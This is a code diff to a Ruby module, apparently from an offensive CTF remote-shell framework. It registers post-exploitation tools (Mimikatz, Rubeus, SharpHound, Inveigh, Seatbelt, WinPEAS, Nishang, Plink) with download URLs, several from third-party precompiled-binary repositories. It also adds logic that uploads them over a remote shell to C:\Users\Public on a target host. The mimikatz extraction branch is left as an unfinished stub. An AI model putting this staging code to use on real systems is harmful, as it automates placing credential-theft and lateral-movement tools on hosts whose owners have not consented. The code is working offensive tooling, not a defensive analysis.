@@ -10,14 +10,25 @@ require 'shellwords'
 
 module EvilCTF::Tools
   TOOL_REGISTRY = {
-    mimikatz: { 
-      name: "Mimikatz", 
-      filename: "mimikatz.exe",
-      description: "Extract credentials from memory",
+    sharphound: { 
+      name: "SharpHound (BloodHound Collector)", 
+      filename: "SharpHound.exe",
+      description: "BloodHound AD collector",
+      category: "reconnaissance",
+      download_url: "https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe",
+      backup_urls: [
+        "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe"
+      ],
+      recommended_remote: "C:\\Users\\Public\\SharpHound.exe"
+    },
+    rubeus: {
+      name: "Rubeus", 
+      filename: "Rubeus.exe",
+      description: "Kerberos ticket manipulation tool",
       category: "credential_tools",
-      download_url: "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220910/mimikatz_trunk.7z",
+      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/Rubeus.exe",
       backup_urls: [],
-      recommended_remote: "C:\\Users\\Public\\mimikatz.exe"
+      recommended_remote: "C:\\Users\\Public\\Rubeus.exe"
     },
     powerview: {
       name: "PowerView", 
@@ -28,6 +39,42 @@ module EvilCTF::Tools
       backup_urls: [],
       recommended_remote: "C:\\Users\\Public\\PowerView.ps1"
     },
+    mimikatz: { 
+      name: "Mimikatz", 
+      filename: "mimikatz.exe",
+      description: "Extract credentials from memory",
+      category: "credential_tools",
+      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/Credentials/mimikatz.exe",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\mimikatz.exe"
+    },
+    winpeas: {
+      name: "WinPEAS", 
+      filename: "winPEASx64.exe",
+      description: "Windows local enumeration tool",
+      category: "enumeration",
+      download_url: "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\winPEASx64.exe"
+    },
+    seatbelt: {
+      name: "Seatbelt", 
+      filename: "Seatbelt.exe",
+      description: "Windows post-exploitation tool",
+      category: "enumeration",
+      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/Enumeration/Seatbelt.exe",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\Seatbelt.exe"
+    },
+    inveigh: {
+      name: "Inveigh", 
+      filename: "Inveigh.ps1",
+      description: "Windows SMB relay and HTTP proxy tool",
+      category: "reconnaissance",
+      download_url: "https://github.com/jakobfriedl/precompiled-binaries/raw/main/Scripts/Inveigh.ps1",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\Inveigh.ps1"
+    },
     procdump: {
       name: "ProcDump", 
       filename: "procdump64.exe",
@@ -36,6 +83,24 @@ module EvilCTF::Tools
       download_url: "https://download.sysinternals.com/files/Procdump.zip",
       backup_urls: [],
       recommended_remote: "C:\\Users\\Public\\procdump64.exe"
+    },
+    nishang: {
+      name: "Nishang", 
+      filename: "nishang.ps1",
+      description: "PowerShell attack framework",
+      category: "reconnaissance",
+      download_url: "https://github.com/samratashok/nishang/archive/refs/tags/v0.7.6.zip",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\nishang.ps1"
+    },
+    plink: {
+      name: "Plink", 
+      filename: "plink.exe",
+      description: "SSH client for tunneling",
+      category: "tunneling",
+      download_url: "https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe",
+      backup_urls: [],
+      recommended_remote: "C:\\Users\\Public\\plink.exe"
     }
   }.freeze
 
@@ -204,6 +269,23 @@ module EvilCTF::Tools
     arch = get_system_architecture(shell)
     adjusted_tool = tool.dup
 
+    # Handle architecture-specific tools
+    if tool_key == 'procdump'
+      if arch == 'x64'
+        adjusted_tool[:filename] = 'procdump64.exe'
+        adjusted_tool[:download_url] = 'https://live.sysinternals.com/tools/procdump64.exe'
+        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump64.exe'
+      else
+        adjusted_tool[:filename] = 'procdump.exe'
+        adjusted_tool[:download_url] = 'https://live.sysinternals.com/tools/procdump.exe'
+        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump.exe'
+      end
+    elsif tool_key == 'mimikatz' && tool[:zip]
+      # For mimikatz, we need to download the .7z and extract it properly
+      # This is a simplified version - you may want to add proper extraction logic
+      adjusted_tool[:filename] = 'mimikatz.exe'
+    end
+
     local_path = find_tool_on_disk(tool_key)
     unless local_path && File.exist?(local_path)
       puts "[!] Local tool not found: #{adjusted_tool[:filename]}"
@@ -211,8 +293,16 @@ module EvilCTF::Tools
       return false unless local_path && File.exist?(local_path)
     end
 
-    puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
-    EvilCTF::Uploader.upload_file(local_path, remote_path, shell)
+    puts "[*] Staging #{adjusted_tool[:name]} to #{adjusted_tool[:recommended_remote]}"
+    verify_result = EvilCTF::Uploader.upload_file(local_path, adjusted_tool[:recommended_remote], shell)
+    
+    if verify_result
+      puts "[+] Successfully staged #{adjusted_tool[:name]}"
+      return true
+    else
+      puts "[!] Upload verification failed for #{adjusted_tool[:name]}"
+      return false
+    end
   rescue => e
     puts "[!] Auto staging failed: #{e.message}"
     false
@@ -379,3 +469,4 @@ module EvilCTF::Tools
     {}
   end
 end
+
